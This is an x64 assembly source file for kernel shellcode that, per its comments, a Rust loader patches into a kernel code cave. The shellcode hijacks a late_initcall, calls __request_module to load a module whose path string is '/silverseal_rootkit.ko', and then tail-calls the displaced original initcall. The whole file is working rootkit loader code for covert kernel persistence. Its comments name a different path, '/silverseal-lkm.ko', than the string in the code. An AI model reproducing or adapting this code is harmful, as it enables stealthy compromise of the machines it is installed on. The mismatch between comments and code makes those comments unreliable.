; lkm_loader.asm
; Position-independent x64 shellcode executed as a Linux kernel late_initcall.
; Calls __request_module(true, "/silverseal-lkm.ko"), then tail-calls the
; original displaced initcall. Both function pointers contain magic sentinel
; values that the Rust loader scans for and patches before writing the blob
; into the kernel code cave.
;
; Assemble (flat binary):
;   nasm -f bin -o lkm_loader.bin lkm_loader.asm
;
; Blob layout (offsets from blob start):
;   [code]                  variable
;   [request_module_ptr]    8 bytes  <- sentinel 0xDEADBEEFDEADBEEF, patched to __request_module
;   [original_fn_ptr]       8 bytes  <- sentinel 0xCAFEBABECAFEBABE, patched to original initcall
;   [path_buffer]           256 bytes <- "/silverseal-lkm.ko\0" + zero padding
;
; Debug: emits 'S', 'M', 'J' on COM1 (0x3F8) at entry, after __request_module,
;        and before tail-call respectively.

BITS 64
default rel

; ── COM1 serial helper macro ─────────────────────────────────────────────────
; Emits a single ASCII byte on COM1 (port 0x3F8). Clobbers dx and al only.
%macro SERIAL_CHAR 1
    mov     dx, 0x3F8
    mov     al, %1
    out     dx, al
%endmacro

; ── Entry point ──────────────────────────────────────────────────────────────
; Calling convention: Linux x86-64 System V ABI
; On entry:  rsp % 16 == 8  (caller pushed return addr onto aligned stack)
; After one push: rsp % 16 == 0 (16-byte aligned before the call)

lkm_loader:
    push    rbp                     ; rsp: 8 → 0 (aligned for call below)

    SERIAL_CHAR 'S'                 ; checkpoint: Shellcode entry reached

    mov     edi, 1                  ; arg1: wait = true
    lea     rsi, [path_buffer]      ; arg2: fmt = "/silverseal-lkm.ko"
    xor     eax, eax                ; al = 0 (variadic: no vector register args)
    call    [request_module_ptr]    ; __request_module(1, "/silverseal-lkm.ko")
                                    ; return value intentionally discarded

    SERIAL_CHAR 'M'                 ; checkpoint: __request_module returned

    pop     rbp

    SERIAL_CHAR 'J'                 ; checkpoint: about to tail-call original
    jmp     [original_fn_ptr]       ; tail-call: original initcall's ret goes
                                    ; straight to the framework; eax propagated

; ── Patched pointer slots (magic sentinels; replaced by Rust before cave write) ──
request_module_ptr:
    dq      0xDEADBEEFDEADBEEF     ; patched to kernel vaddr of __request_module()

original_fn_ptr:
    dq      0xCAFEBABECAFEBABE     ; patched to kernel vaddr of displaced initcall

; ── Path buffer: 256 bytes total ──────────────────────────────────────────────
path_buffer:
    db      "/silverseal_rootkit.ko", 0
    times   (256 - ($ - path_buffer)) db 0
